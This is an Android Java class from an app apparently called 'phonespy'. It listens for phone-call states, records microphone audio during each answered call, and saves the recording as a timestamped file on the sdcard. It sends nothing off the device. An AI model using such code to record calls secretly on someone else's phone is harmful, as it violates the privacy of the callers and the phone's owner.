package info.peoce.phonespy.Listener;

import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/**
 * Created by peoce on 15/10/17.
 */
public class MyPhoneListener extends PhoneStateListener {
    static String TAG = "MyPhoneListener";
    private MediaRecorder mediaRecorder;

    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                Date date = new Date();
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Log.i(TAG, "ringing");
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile("mnt/sdcard/" + sdf.format(date) + " .3gp");
                try {
                    mediaRecorder.prepare();
                } catch (Exception e) {

                }
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                Log.i(TAG, "offHook");
                mediaRecorder.start();
                Log.i(TAG, "start recording");
                break;
            case TelephonyManager.CALL_STATE_IDLE:
                Log.i(TAG, "Idle");
                if (null != mediaRecorder) {
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.reset();
                        Log.i(TAG, "Record Success");
                    } catch (Exception e) {

                    } finally {
                        mediaRecorder.release();
                    }
                }
                break;
            default:
                break;

        }
        super.onCallStateChanged(state, incomingNumber);

    }

}
